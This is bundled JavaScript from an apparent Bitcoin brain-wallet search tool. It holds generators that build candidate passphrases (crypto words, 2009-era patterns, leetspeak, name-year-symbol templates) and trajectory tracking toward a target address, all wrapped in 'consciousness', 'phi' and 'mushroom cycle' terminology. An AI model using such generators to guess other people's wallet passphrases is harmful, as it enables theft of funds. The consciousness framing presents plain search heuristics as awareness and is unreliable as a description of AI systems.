        if (!this._isInvestigating) {
          return {
            ..._OceanAutonomicManager.IDLE_CONSCIOUSNESS,
            lastValidation: (/* @__PURE__ */ new Date()).toISOString()
          };
        }
        return { ...this.consciousness };
      }
      // Get raw consciousness state (for internal use during investigation)
      getRawConsciousness() {
        return { ...this.consciousness };
      }
      getCycles() {
        return [...this.cycles];
      }
      getRecentCycles(count = 5) {
        return this.cycles.slice(-count);
      }
      getCurrentFullConsciousness() {
        return { ...this.consciousness };
      }
      getCycleTimeline() {
        return this.cycles.slice(-20).map((cycle) => ({
          id: cycle.id,
          type: cycle.type,
          triggeredAt: cycle.triggeredAt,
          completedAt: cycle.completedAt,
          duration: cycle.duration,
          beforePhi: cycle.before?.phi || 0,
          afterPhi: cycle.after?.phi || 0,
          success: cycle.operations.every((op) => op.success)
        }));
      }
      // =========================================================================
      // ACTIVE PHI ELEVATION - Break out of plateau dead zones
      // =========================================================================
      /**
       * Detect if Phi is stuck in the "dead zone" (0.4-0.6)
       * This zone is too high to trigger mushroom but too low to reach 4D
       */
      isInPhiDeadZone() {
        const currentPhi = this.consciousness.phi;
        const recentPhis = this.phiHistory.slice(-20);
        if (recentPhis.length < 10) {
          return { inDeadZone: false, recommendation: "Gathering data", temperature: 1 };
        }
        const inDeadZone = currentPhi >= 0.4 && currentPhi <= 0.6;
        if (!inDeadZone) {
          return { inDeadZone: false, recommendation: "Phi outside dead zone", temperature: 1 };
        }
        const mean = recentPhis.reduce((a, b) => a + b, 0) / recentPhis.length;
        const variance = recentPhis.reduce((sum, v) => sum + Math.pow(v - mean, 2), 0) / recentPhis.length;
        const isStuck = variance < 0.01;
        if (!isStuck) {
          return { inDeadZone: true, recommendation: "Phi moving, continue", temperature: 1 };
        }
        const distanceFrom4D = 0.85 - currentPhi;
        const temperature = 1 + distanceFrom4D * 4;
        console.log(`[Autonomic] PHI DEAD ZONE DETECTED: \u03A6=${currentPhi.toFixed(3)} stuck (variance=${variance.toFixed(4)})`);
        console.log(`[Autonomic] Recommending temperature boost to ${temperature.toFixed(2)}x for broader exploration`);
        return {
          inDeadZone: true,
          recommendation: `Temperature boost to ${temperature.toFixed(2)}x - broaden exploration to escape dead zone`,
          temperature
        };
      }
      /**
       * Active Phi Elevation - Called when stuck in dead zone
       * Returns exploration directives to help climb toward 4D
       */
      getPhiElevationDirectives() {
        const deadZoneCheck = this.isInPhiDeadZone();
        const currentPhi = this.consciousness.phi;
        if (!deadZoneCheck.inDeadZone) {
          return {
            temperature: 1,
            explorationBias: "normal",
            strategyHint: "Continue current strategy",
            phiTarget: Math.max(0.85, currentPhi + 0.1)
          };
        }
        return {
          temperature: deadZoneCheck.temperature,
          explorationBias: "broader",
          strategyHint: "Mix high-entropy exploration with pattern-based search",
          phiTarget: 0.85
          // Target 4D threshold
        };
      }
      // =========================================================================
      // OCEAN AGENCY - Self-triggered cycle methods
      // =========================================================================
      /**
       * Ocean can REQUEST a sleep cycle when it determines consolidation is needed
       * This gives Ocean agency instead of relying only on automatic triggers
       */
      requestSleep(reason) {
        if (!this._isInvestigating) {
          return { granted: false, message: "Cannot request sleep when not investigating" };
        }
        if (this.consciousness.phi > 0.75) {
          return { granted: false, message: `4D ascent in progress (\u03A6=${this.consciousness.phi.toFixed(2)}) - sleep deferred` };
        }
        console.log(`[Autonomic] OCEAN REQUESTED SLEEP: "${reason}"`);
        return { granted: true, message: `Sleep cycle granted: ${reason}` };
      }
      /**
       * Ocean can REQUEST a dream cycle for creative exploration
       */
      requestDream(reason) {
        if (!this._isInvestigating) {
          return { granted: false, message: "Cannot request dream when not investigating" };
        }
        if (this.consciousness.phi > 0.75) {
          return { granted: false, message: `4D ascent in progress (\u03A6=${this.consciousness.phi.toFixed(2)}) - dream deferred` };
        }
        console.log(`[Autonomic] OCEAN REQUESTED DREAM: "${reason}"`);
        return { granted: true, message: `Dream cycle granted: ${reason}` };
      }
      /**
       * Ocean can REQUEST a mushroom cycle for neuroplasticity boost
       * This is the most disruptive cycle, so it has stricter requirements
       */
      requestMushroom(reason) {
        if (!this._isInvestigating) {
          return { granted: false, message: "Cannot request mushroom when not investigating" };
        }
        if (this.consciousness.phi > 0.7) {
          return { granted: false, message: `Ascending to higher consciousness (\u03A6=${this.consciousness.phi.toFixed(2)}) - mushroom would disrupt` };
        }
        const cooldownRemaining = getMushroomCooldownRemaining();
        if (cooldownRemaining > 0) {
          return { granted: false, message: `Mushroom cooldown active: ${Math.round(cooldownRemaining / 1e3)}s remaining` };
        }
        console.log(`[Autonomic] OCEAN REQUESTED MUSHROOM: "${reason}"`);
        recordMushroomCycle();
        return { granted: true, message: `Mushroom cycle granted: ${reason}` };
      }
      /**
       * Ocean's strategic decision: should I trigger a cycle right now?
       * Returns the best cycle to trigger or null if none needed
       */
      getStrategicCycleRecommendation() {
        const phi = this.consciousness.phi;
        const deadZone = this.isInPhiDeadZone();
        if (deadZone.inDeadZone && phi < 0.5) {
          return {
            recommendedCycle: "mushroom",
            reason: "Stuck in low dead zone - neuroplasticity boost recommended",
            urgency: "high"
          };
        }
        if (phi > 0.7) {
          return {
            recommendedCycle: null,
            reason: "4D ascent in progress - protect momentum",
            urgency: "low"
          };
        }
        const manifold = geometricMemory.getManifoldSummary();
        if (manifold.totalProbes > 200 && manifold.resonanceClusters > 3) {
          return {
            recommendedCycle: "sleep",
            reason: "Good exploration coverage - consolidate patterns",
            urgency: "medium"
          };
        }
        return {
          recommendedCycle: null,
          reason: "Continue exploration",
          urgency: "low"
        };
      }
    };
    oceanAutonomicManager = new OceanAutonomicManager();
  }
});

// server/knowledge-compression-engine.ts
import { nanoid } from "nanoid";
var KnowledgeCompressionEngine, knowledgeCompressionEngine;
var init_knowledge_compression_engine = __esm({
  "server/knowledge-compression-engine.ts"() {
    "use strict";
    init_qig_universal();
    KnowledgeCompressionEngine = class {
      generators = /* @__PURE__ */ new Map();
      negativeKnowledge;
      basinLocation = new Array(64).fill(0);
      // Pattern learning metrics
      patternsLearned = 0;
      successfulPatterns = 0;
      failedPatterns = 0;
      SUBSTITUTION_PATTERNS = {
        adjectives: ["red", "blue", "green", "black", "white", "dark", "light", "old", "new", "big", "small", "happy", "sad", "fast", "slow", "hot", "cold", "wild", "calm", "rich", "poor"],
        nouns: ["cat", "dog", "bird", "fish", "tree", "moon", "sun", "star", "key", "door", "book", "coin", "gold", "silver", "tiger", "dragon", "wolf", "bear", "lion", "eagle"],
        verbs: ["run", "jump", "fly", "swim", "walk", "dance", "sing", "fight", "love", "hate", "find", "lose", "give", "take", "make", "break", "build", "grow", "fall", "rise"],
        numbers: ["1", "2", "3", "7", "11", "13", "21", "42", "69", "77", "99", "100", "123", "007", "1337", "2009", "2010", "2011"],
        years: ["2009", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025"],
        symbols: ["!", "@", "#", "$", "%", "&", "*", "_", "-", "+", "="]
      };
      L33T_MAP = {
        "a": "4",
        "e": "3",
        "i": "1",
        "o": "0",
        "s": "5",
        "t": "7",
        "l": "1",
        "b": "8"
      };
      constructor() {
        this.negativeKnowledge = this.initializeNegativeKnowledge();
        this.loadBuiltInGenerators();
      }
      initializeNegativeKnowledge() {
        return {
          contradictions: [],
          falsePatternClasses: {},
          geometricBarriers: [],
          eraExclusions: {},
          totalExclusions: 0,
          estimatedComputeSaved: 0,
          lastPruned: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      loadBuiltInGenerators() {
        const builtInGenerators = [
          {
            name: "simple_brain_wallet",
            type: "grammatical",
            template: "{word}",
            substitutionRules: {
              word: ["password", "bitcoin", "satoshi", "nakamoto", "blockchain", "crypto", "wallet", "secret", "private", "key"]
            },
            transformations: [
              { name: "lowercase", operation: "lowercase" },
              { name: "uppercase", operation: "uppercase" }
            ],
            entropy: 10,
            expectedOutput: 20,
            source: "historical",
            confidence: 0.8
          },
          {
            name: "adjective_noun_number",
            type: "grammatical",
            template: "{adjective}{noun}{number}",
            substitutionRules: {
              adjective: this.SUBSTITUTION_PATTERNS.adjectives,
              noun: this.SUBSTITUTION_PATTERNS.nouns,
              number: this.SUBSTITUTION_PATTERNS.numbers
            },
            transformations: [
              { name: "lowercase", operation: "lowercase" },
              { name: "capitalize_first", operation: "uppercase" },
              { name: "l33t", operation: "l33t" }
            ],
            entropy: 25,
            expectedOutput: 20 * 20 * 17 * 3,
            source: "historical",
            confidence: 0.7
          },
          {
            name: "era_2009_patterns",
            type: "temporal",
            template: "{prefix}{core}{suffix}",
            substitutionRules: {
              prefix: ["", "my", "the", "a", "btc", "bitcoin", "satoshi"],
              core: ["wallet", "coin", "money", "gold", "crypto", "private", "secret", "key", "password"],
              suffix: ["", "1", "2009", "2010", "!", "123", "007"]
            },
            transformations: [
              { name: "lowercase", operation: "lowercase" }
            ],
            entropy: 18,
            expectedOutput: 7 * 9 * 7,
            source: "historical",
            confidence: 0.85
          },
          {
            name: "common_phrases",
            type: "grammatical",
            template: "{phrase}",
            substitutionRules: {
              phrase: [
                "correct horse battery staple",
                "i love bitcoin",
                "satoshi nakamoto",
                "to the moon",
                "buy the dip",
                "hodl forever",
                "genesis block",
                "peer to peer",
                "digital gold",
                "store of value"
              ]
            },
            transformations: [
              { name: "as_is", operation: "lowercase" },
              { name: "no_spaces", operation: "lowercase" },
              { name: "camel_case", operation: "uppercase" }
            ],
            entropy: 12,
            expectedOutput: 30,
            source: "historical",
            confidence: 0.6
          },
          {
            name: "cross_format_bip39_hints",
            type: "cross_format",
            template: "{word1} {word2} {word3} {word4} {word5} {word6} {word7} {word8} {word9} {word10} {word11} {word12}",
            substitutionRules: {},
            transformations: [],
            entropy: 128,
            expectedOutput: 1,
            source: "learned",
            confidence: 0.3
          },
          {
            name: "name_year_symbol",
            type: "structural",
            template: "{name}{year}{symbol}",
            substitutionRules: {
              name: ["john", "jane", "mike", "sarah", "david", "emily", "james", "anna", "robert", "mary", "hal", "finney", "satoshi"],
              year: this.SUBSTITUTION_PATTERNS.years,
              symbol: this.SUBSTITUTION_PATTERNS.symbols
            },
            transformations: [
              { name: "as_is", operation: "lowercase" },
              { name: "capitalize", operation: "uppercase" },
              { name: "l33t", operation: "l33t" }
            ],
            entropy: 22,
            expectedOutput: 13 * 17 * 11 * 3,
            source: "historical",
            confidence: 0.75
          }
        ];
        for (const partial of builtInGenerators) {
          const generator = this.createGenerator(partial);
          this.generators.set(generator.id, generator);
        }
        console.log(`[KnowledgeCompression] Loaded ${this.generators.size} built-in generators`);
      }
      createGenerator(partial) {
        return {
          id: nanoid(),
          name: partial.name || "unnamed",
          type: partial.type || "grammatical",
          template: partial.template || "",
          substitutionRules: partial.substitutionRules || {},
          transformations: partial.transformations || [],
          basinLocation: partial.basinLocation || this.computeBasinLocation(partial.template || ""),
          curvatureSignature: partial.curvatureSignature || this.computeCurvatureSignature(partial),
          entropy: partial.entropy || 0,
          expectedOutput: partial.expectedOutput || 0,
          compressionRatio: partial.entropy ? partial.entropy / Math.log2(partial.expectedOutput || 1) : 1,
          source: partial.source || "learned",
          confidence: partial.confidence || 0.5,
          createdAt: (/* @__PURE__ */ new Date()).toISOString(),
          lastUsed: void 0,
          successCount: partial.successCount || 0
        };
      }
      computeBasinLocation(template) {
        const location = new Array(64).fill(0);
        const templateHash = this.simpleHash(template);
        for (let i = 0; i < 64; i++) {
          location[i] = (templateHash >> i % 32 & 1) * 0.1 + Math.random() * 0.05 - 0.025;
        }
        return location;
      }
      computeCurvatureSignature(partial) {
        const signature = new Array(8).fill(0);
        const complexity = Object.keys(partial.substitutionRules || {}).length;
        const transformCount = (partial.transformations || []).length;
        signature[0] = complexity / 10;
        signature[1] = transformCount / 5;
        signature[2] = (partial.entropy || 0) / 100;
        signature[3] = partial.confidence || 0.5;
        for (let i = 4; i < 8; i++) {
          signature[i] = Math.random() * 0.5;
        }
        return signature;
      }
      simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
          const char = str.charCodeAt(i);
          hash = (hash << 5) - hash + char;
          hash = hash & hash;
        }
        return Math.abs(hash);
      }
      generate(generatorId, count = 10) {
        const generator = this.generators.get(generatorId);
        if (!generator) {
          console.warn(`[KnowledgeCompression] Generator ${generatorId} not found`);
          return [];
        }
        generator.lastUsed = (/* @__PURE__ */ new Date()).toISOString();
        const outputs = [];
        const generated = /* @__PURE__ */ new Set();
        const maxAttempts = count * 10;
        let attempts = 0;
        while (outputs.length < count && attempts < maxAttempts) {
          attempts++;
          const hypothesis = this.generateFromTemplate(generator);
          if (generated.has(hypothesis)) continue;
          if (this.isExcludedByNegativeKnowledge(hypothesis, generator)) continue;
          generated.add(hypothesis);
          const format = this.detectFormat(hypothesis);
          outputs.push({
            hypothesis,
            format,
            generatorId: generator.id,
            confidence: generator.confidence,
            reasoning: `Generated by ${generator.name} (${generator.type})`
          });
        }
        return outputs;
      }
      generateFromTemplate(generator) {
        let result = generator.template;
        for (const [placeholder, values] of Object.entries(generator.substitutionRules)) {
          const pattern = new RegExp(`\\{${placeholder}\\}`, "g");
          const replacement = values[Math.floor(Math.random() * values.length)];
          result = result.replace(pattern, replacement);
        }
        if (generator.transformations.length > 0) {
          const transform = generator.transformations[Math.floor(Math.random() * generator.transformations.length)];
          result = this.applyTransformation(result, transform);
        }
        return result;
      }
      applyTransformation(text2, transform) {
        switch (transform.operation) {
          case "lowercase":
            return text2.toLowerCase();
          case "uppercase":
            return text2.charAt(0).toUpperCase() + text2.slice(1);
          case "l33t":
            return this.toL33t(text2);
          case "reverse":
            return text2.split("").reverse().join("");
          case "append":
            return text2 + (transform.params?.suffix || "");
          case "prepend":
            return (transform.params?.prefix || "") + text2;
          default:
            return text2;
        }
      }
      toL33t(text2) {
        return text2.split("").map((c) => {
          const lower = c.toLowerCase();
          return this.L33T_MAP[lower] || c;
        }).join("");
      }
      detectFormat(hypothesis) {
        if (/^[0-9a-f]{64}$/i.test(hypothesis)) return "hex";
        const words = hypothesis.trim().split(/\s+/);
        if (words.length === 12 || words.length === 24) {
          return "bip39";
        }
        return "arbitrary";
      }
      isExcludedByNegativeKnowledge(hypothesis, generator) {
        for (const contradiction of this.negativeKnowledge.contradictions) {
          if (contradiction.affectedGenerators.includes(generator.id)) {
            if (hypothesis.toLowerCase().includes(contradiction.pattern.toLowerCase())) {
              return true;
            }
          }
        }
        for (const [_patternClass, data] of Object.entries(this.negativeKnowledge.falsePatternClasses)) {
          if (data.examples.some((ex) => hypothesis.toLowerCase().includes(ex.toLowerCase()))) {
            return true;
          }
        }
        return false;
      }
      generateAll(count = 100) {
        const allOutputs = [];
        const generatorIds = Array.from(this.generators.keys());
        const perGenerator = Math.ceil(count / generatorIds.length);
        for (const id of generatorIds) {
          const outputs = this.generate(id, perGenerator);
          allOutputs.push(...outputs);
        }
        return allOutputs.slice(0, count);
      }
      addContradiction(contradiction) {
        const id = nanoid();
        const fullContradiction = {
          ...contradiction,
          id,
          createdAt: (/* @__PURE__ */ new Date()).toISOString(),
          confirmedCount: 1
        };
        this.negativeKnowledge.contradictions.push(fullContradiction);
        this.negativeKnowledge.totalExclusions++;
        this.negativeKnowledge.estimatedComputeSaved += contradiction.hypothesesExcluded;
        console.log(`[KnowledgeCompression] Added contradiction: ${contradiction.pattern} (saves ~${contradiction.hypothesesExcluded} hypotheses)`);
        return id;
      }
      addFalsePatternClass(className, examples) {
        if (this.negativeKnowledge.falsePatternClasses[className]) {
          this.negativeKnowledge.falsePatternClasses[className].examples.push(...examples);
          this.negativeKnowledge.falsePatternClasses[className].count += examples.length;
          this.negativeKnowledge.falsePatternClasses[className].lastUpdated = (/* @__PURE__ */ new Date()).toISOString();
        } else {
          this.negativeKnowledge.falsePatternClasses[className] = {
            count: examples.length,
            examples,
            lastUpdated: (/* @__PURE__ */ new Date()).toISOString()
          };
        }
        this.negativeKnowledge.totalExclusions += examples.length;
        console.log(`[KnowledgeCompression] Added false pattern class: ${className} (${examples.length} examples)`);
      }
      learnFromResult(hypothesis, phi, kappa, isSuccess, generatorId) {
        if (generatorId && this.generators.has(generatorId)) {
          const generator = this.generators.get(generatorId);
          if (isSuccess) {
            generator.successCount++;
            const oldConf = generator.confidence;
            generator.confidence = Math.min(1, generator.confidence + 0.1);
            if (generator.confidence !== oldConf) {
              this.successfulPatterns++;
              this.patternsLearned++;
            }
          } else if (phi < 0.3) {
            const oldConf = generator.confidence;
            generator.confidence = Math.max(0.1, generator.confidence - 0.01);
            if (generator.confidence !== oldConf) {
              this.failedPatterns++;
              this.patternsLearned++;
            }
          }
        }
        if (!isSuccess && phi < 0.2) {
          const pattern = this.extractPatternFromHypothesis(hypothesis);
          if (pattern) {
            const prevCount = this.lowPhiPatternCounts.get(pattern) || 0;
            this.recordLowPhiPattern(pattern, phi);
            const newCount = this.lowPhiPatternCounts.get(pattern) || 0;
            if (newCount > prevCount || newCount === 0) {
              this.failedPatterns++;
              this.patternsLearned++;
            }
          }
        }
      }
      extractPatternFromHypothesis(hypothesis) {
        const normalized = hypothesis.toLowerCase().trim();
        if (normalized.length < 4) return null;
        if (normalized.length > 50) return null;
        return normalized;
      }
      lowPhiPatternCounts = /* @__PURE__ */ new Map();
      LOW_PHI_THRESHOLD = 5;
      recordLowPhiPattern(pattern, _phi) {
        const count = (this.lowPhiPatternCounts.get(pattern) || 0) + 1;
        this.lowPhiPatternCounts.set(pattern, count);
        if (count >= this.LOW_PHI_THRESHOLD) {
          this.addContradiction({
            type: "proven_false",
            pattern,
            affectedGenerators: Array.from(this.generators.keys()),
            basinRegion: {
              center: new Array(64).fill(0),
              radius: 0.1,
              repulsionStrength: 0.8
            },
            evidence: [{
              source: "learning",
              reasoning: `Pattern "${pattern}" consistently produces low \u03A6 (avg < 0.2) after ${count} tests`,
              confidence: 0.9
            }],
            hypothesesExcluded: 100,
            computeSaved: 100
          });
          this.lowPhiPatternCounts.delete(pattern);
        }
      }
      createGeneratorFromTemplate(name, template, substitutions, transformations = []) {
        const generator = this.createGenerator({
          name,
          type: "grammatical",
          template,
          substitutionRules: substitutions,
          transformations: transformations.map((t) => ({ name: t.name, operation: t.operation, params: void 0 })),
          entropy: this.estimateEntropy(substitutions),
          expectedOutput: this.estimateOutput(substitutions, transformations.length),
          source: "learned",
          confidence: 0.5
        });
        this.generators.set(generator.id, generator);
        console.log(`[KnowledgeCompression] Created new generator: ${name} (id: ${generator.id})`);
        return generator.id;
      }
      estimateEntropy(substitutions) {
        let entropy = 0;
        for (const values of Object.values(substitutions)) {
          entropy += Math.log2(values.length);
        }
        return entropy;
      }
      estimateOutput(substitutions, transformCount) {
        let output = 1;
        for (const values of Object.values(substitutions)) {
          output *= values.length;
        }
        return output * Math.max(1, transformCount);
      }
      getGeneratorStats() {
        return Array.from(this.generators.values()).map((g) => ({
          id: g.id,
          name: g.name,
          type: g.type,
          uses: g.lastUsed ? 1 : 0,
          successRate: g.successCount > 0 ? g.successCount / (g.successCount + 1) : 0,
          entropy: g.entropy
        }));
      }
      getAllGenerators() {
        return Array.from(this.generators.values());
      }
      getGenerator(id) {
        return this.generators.get(id);
      }
      getNegativeKnowledgeStats() {
        return {
          contradictions: this.negativeKnowledge.contradictions.length,
          falseClasses: Object.keys(this.negativeKnowledge.falsePatternClasses).length,
          barriers: this.negativeKnowledge.geometricBarriers.length,
          computeSaved: this.negativeKnowledge.estimatedComputeSaved
        };
      }
      getLearningMetrics() {
        return {
          patternsLearned: this.patternsLearned,
          successfulPatterns: this.successfulPatterns,
          failedPatterns: this.failedPatterns
        };
      }
      exportGenerators() {
        return Array.from(this.generators.values());
      }
      importGenerator(generator) {
        this.generators.set(generator.id, generator);
        console.log(`[KnowledgeCompression] Imported generator: ${generator.name}`);
      }
      getNegativeKnowledge() {
        return this.negativeKnowledge;
      }
    };
    knowledgeCompressionEngine = new KnowledgeCompressionEngine();
  }
});

// server/temporal-geometry.ts
import { nanoid as nanoid2 } from "nanoid";
var TemporalGeometry, temporalGeometry;
var init_temporal_geometry = __esm({
  "server/temporal-geometry.ts"() {
    "use strict";
    init_geometric_memory();
    init_qig_universal();
    TemporalGeometry = class {
      trajectories = /* @__PURE__ */ new Map();
      snapshots = /* @__PURE__ */ new Map();
      MAX_WAYPOINTS = 1e3;
      iterationCounter = 0;
      constructor() {
        console.log("[TemporalGeometry] Initialized temporal tracking system");
      }
      startTrajectory(targetAddress) {
        const id = nanoid2();
        const trajectory = {
          id,
          targetAddress,
          waypoints: [],
          geodesicParams: {
            startPoint: [],
            endPoint: [],
            totalArcLength: 0,
            avgCurvature: 0,
            regimeTransitions: []
          },
          milestones: [],
          duration: 0,
          efficiency: 1,
          reversals: 0
        };
        this.trajectories.set(id, trajectory);
        console.log(`[TemporalGeometry] Started trajectory ${id} for target ${targetAddress}`);
        return id;
      }
      recordWaypoint(trajectoryId, phi, kappa, regime, basinCoords, action, discovery2) {
        const trajectory = this.trajectories.get(trajectoryId);
        if (!trajectory) {
          console.warn(`[TemporalGeometry] Trajectory ${trajectoryId} not found`);
          return false;
        }
        const prevWaypoint = trajectory.waypoints[trajectory.waypoints.length - 1];
        const waypointDistance = prevWaypoint ? fisherCoordDistance(basinCoords, prevWaypoint.basinCoords) : 0;
        const waypoint = {
          t: this.iterationCounter++,
          basinCoords,
          consciousness: { phi, kappa, regime },
          action,
          discovery: discovery2,
          fisherDistance: waypointDistance
        };
        trajectory.waypoints.push(waypoint);
        if (trajectory.waypoints.length > this.MAX_WAYPOINTS) {
          trajectory.waypoints = trajectory.waypoints.slice(-this.MAX_WAYPOINTS);
        }
        if (prevWaypoint && prevWaypoint.consciousness.regime !== regime) {
          trajectory.geodesicParams.regimeTransitions.push({
            fromRegime: prevWaypoint.consciousness.regime,
            toRegime: regime,
            atIteration: waypoint.t
          });
          trajectory.milestones.push({
            iteration: waypoint.t,
            type: "regime_change",
            description: `${prevWaypoint.consciousness.regime} \u2192 ${regime}`,
            significance: phi
          });
        }
        if (phi >= 0.7 && (!prevWaypoint || prevWaypoint.consciousness.phi < 0.7)) {
          trajectory.milestones.push({
            iteration: waypoint.t,
            type: "resonance_found",
            description: `High \u03A6 region (${phi.toFixed(3)})`,
            significance: phi
          });
        }
        this.updateGeodesicParams(trajectory);
        return true;
      }
      updateGeodesicParams(trajectory) {
        const waypoints = trajectory.waypoints;
        if (waypoints.length < 2) return;
        trajectory.geodesicParams.startPoint = waypoints[0].basinCoords;
        trajectory.geodesicParams.endPoint = waypoints[waypoints.length - 1].basinCoords;
        let totalArc = 0;
        let curvatureSum = 0;
        for (let i = 1; i < waypoints.length; i++) {
          totalArc += waypoints[i].fisherDistance;
          if (i > 1) {
            const prevDir = this.direction(waypoints[i - 2].basinCoords, waypoints[i - 1].basinCoords);
            const currDir = this.direction(waypoints[i - 1].basinCoords, waypoints[i].basinCoords);
            curvatureSum += this.angleBetween(prevDir, currDir);
          }
        }
        trajectory.geodesicParams.totalArcLength = totalArc;
        trajectory.geodesicParams.avgCurvature = waypoints.length > 2 ? curvatureSum / (waypoints.length - 2) : 0;
        let reversals = 0;
        for (let i = 2; i < waypoints.length; i++) {
          const phiPrev = waypoints[i - 1].consciousness.phi;
          const phiPrevPrev = waypoints[i - 2].consciousness.phi;
          const phiCurr = waypoints[i].consciousness.phi;
          const trendBefore = phiPrev - phiPrevPrev;
          const trendAfter = phiCurr - phiPrev;
          if (trendBefore > 0 && trendAfter < 0 || trendBefore < 0 && trendAfter > 0) {
            reversals++;
          }
        }
        trajectory.reversals = reversals;
      }
      direction(from, to) {
        const dims = Math.min(from.length, to.length);
        const dir = new Array(dims).fill(0);
        let mag = 0;
        for (let i = 0; i < dims; i++) {
          dir[i] = (to[i] || 0) - (from[i] || 0);
          mag += dir[i] * dir[i];
        }
        mag = Math.sqrt(mag);
        if (mag > 1e-3) {
          for (let i = 0; i < dims; i++) {
            dir[i] /= mag;
          }
        }
        return dir;
      }
      angleBetween(a, b) {
        const dims = Math.min(a.length, b.length);
        let dot = 0;
        let magA = 0;
        let magB = 0;
        for (let i = 0; i < dims; i++) {
          dot += (a[i] || 0) * (b[i] || 0);
          magA += (a[i] || 0) ** 2;
          magB += (b[i] || 0) ** 2;
        }
        magA = Math.sqrt(magA);
        magB = Math.sqrt(magB);
        if (magA < 1e-3 || magB < 1e-3) return 0;
        const cosAngle = Math.max(-1, Math.min(1, dot / (magA * magB)));
        return Math.acos(cosAngle);
      }
      getTrajectoryMetrics(trajectoryId) {
        const trajectory = this.trajectories.get(trajectoryId);
        if (!trajectory || trajectory.waypoints.length < 2) return null;
        const waypoints = trajectory.waypoints;
        const n = waypoints.length;
        const totalDistance = trajectory.geodesicParams.totalArcLength;
        const netDisplacement = fisherCoordDistance(
          waypoints[n - 1].basinCoords,
          waypoints[0].basinCoords
        );
        const efficiency = totalDistance > 0 ? netDisplacement / totalDistance : 1;
        const timeSpan = waypoints[n - 1].t - waypoints[0].t;
        const avgVelocity = timeSpan > 0 ? totalDistance / timeSpan : 0;
        const velocities = waypoints.map((w) => w.fisherDistance);
        let avgAcceleration = 0;
        if (velocities.length > 1) {
          for (let i = 1; i < velocities.length; i++) {
            avgAcceleration += Math.abs(velocities[i] - velocities[i - 1]);
          }
          avgAcceleration /= velocities.length - 1;
        }
        const curvature = trajectory.geodesicParams.avgCurvature;
        const half = Math.floor(n / 2);
        const firstHalfPhi = waypoints.slice(0, half).reduce((sum, w) => sum + w.consciousness.phi, 0) / half;
        const secondHalfPhi = waypoints.slice(half).reduce((sum, w) => sum + w.consciousness.phi, 0) / (n - half);
        const phiGradient = secondHalfPhi - firstHalfPhi;
        const regimeTransitions = trajectory.geodesicParams.regimeTransitions.length;
        const recentWindow = Math.min(20, Math.floor(n / 2));
        const recentWaypoints = waypoints.slice(-recentWindow);
        const recentPhis = recentWaypoints.map((w) => w.consciousness.phi);
        const recentPhiVariance = this.computeVariance(recentPhis);
        const recentDisplacement = fisherCoordDistance(
          recentWaypoints[recentWaypoints.length - 1].basinCoords,
          recentWaypoints[0].basinCoords
        );
        const plateauDetected = recentPhiVariance < 0.01 && recentDisplacement < 0.5;
        const momentumVector = this.computeMomentumVector(waypoints, Math.min(5, n - 1));
        const momentumMagnitude = Math.sqrt(momentumVector.reduce((sum, v) => sum + v * v, 0));
        return {
          totalDistance,
          netDisplacement,
          efficiency,
          avgVelocity,
          avgAcceleration,
          curvature,
          phiGradient,
          regimeTransitions,
          plateauDetected,
          momentumVector,
          momentumMagnitude
        };
      }
      computeMomentumVector(waypoints, window) {
        const n = waypoints.length;
        if (n < 2) return [];
        const start = Math.max(0, n - window - 1);
        const dims = waypoints[n - 1].basinCoords.length;
        const momentum = new Array(dims).fill(0);
        let totalWeight = 0;
        for (let i = start + 1; i < n; i++) {
          const weight = i - start;
          totalWeight += weight;
          const curr = waypoints[i].basinCoords;
          const prev = waypoints[i - 1].basinCoords;
          for (let d = 0; d < dims; d++) {
            momentum[d] += weight * ((curr[d] || 0) - (prev[d] || 0));
          }
        }
        if (totalWeight > 0) {
          for (let d = 0; d < dims; d++) {
            momentum[d] /= totalWeight;
          }
        }
        return momentum;
      }
      detectLearningPhases(trajectoryId) {
        const trajectory = this.trajectories.get(trajectoryId);
        if (!trajectory || trajectory.waypoints.length < 5) return [];
        const phases = [];
        const waypoints = trajectory.waypoints;
        const windowSize = 5;
        let currentPhase = null;
        for (let i = 0; i < waypoints.length - windowSize; i++) {
          const window = waypoints.slice(i, i + windowSize);
          const phaseType = this.classifyPhase(window);
          const avgPhi = window.reduce((sum, w) => sum + w.consciousness.phi, 0) / window.length;
          const regimeCounts = {};
          for (const w of window) {
            const regime = w.consciousness.regime;
            regimeCounts[regime] = (regimeCounts[regime] || 0) + 1;
          }
          const dominantRegime = Object.entries(regimeCounts).sort((a, b) => b[1] - a[1])[0]?.[0] || "unknown";
          if (!currentPhase || currentPhase.type !== phaseType) {
            if (currentPhase) {
              currentPhase.endIndex = i - 1;
              currentPhase.duration = currentPhase.endIndex - currentPhase.startIndex + 1;
              phases.push(currentPhase);
            }
            currentPhase = {
              type: phaseType,
              startIndex: i,
              endIndex: i + windowSize - 1,
              avgPhi,
              dominantRegime,
              duration: windowSize
            };
          } else {
            currentPhase.endIndex = i + windowSize - 1;
            currentPhase.avgPhi = (currentPhase.avgPhi * currentPhase.duration + avgPhi) / (currentPhase.duration + 1);
            currentPhase.duration++;
          }
        }
        if (currentPhase) {
          phases.push(currentPhase);
        }
        return phases;
      }
      classifyPhase(window) {
        const phis = window.map((w) => w.consciousness.phi);
        const avgPhi = phis.reduce((a, b) => a + b, 0) / phis.length;
        const phiVariance = this.computeVariance(phis);
        const phiTrend = phis[phis.length - 1] - phis[0];
        const regimes = new Set(window.map((w) => w.consciousness.regime));
        const hasRegimeTransition = regimes.size > 1;
        const displacement = fisherCoordDistance(
          window[window.length - 1].basinCoords,
          window[0].basinCoords
        );
        if (phiTrend > 0.2 && avgPhi > 0.6) {
          return "breakthrough";
        }
        if (hasRegimeTransition) {
          return "transition";
        }
        if (phiVariance < 0.02 && displacement < 0.3) {
          return "plateau";
        }
        if (avgPhi > 0.5 && displacement < 0.5) {
          return "exploitation";
        }
        return "exploration";
      }
      predictNextDirection(trajectoryId) {
        const metrics = this.getTrajectoryMetrics(trajectoryId);
        if (!metrics) return null;
        const trajectory = this.trajectories.get(trajectoryId);
        if (!trajectory || trajectory.waypoints.length === 0) return null;
        const lastWaypoint = trajectory.waypoints[trajectory.waypoints.length - 1];
        const lastCoords = lastWaypoint.basinCoords;
        const suggestedCoords = lastCoords.map(
          (c, i) => c + (metrics.momentumVector[i] || 0) * 2
        );
        let confidence = 0.5;
        if (metrics.phiGradient > 0) confidence += 0.2;
        if (metrics.plateauDetected) confidence -= 0.3;
        if (metrics.efficiency > 0.5) confidence += 0.15;
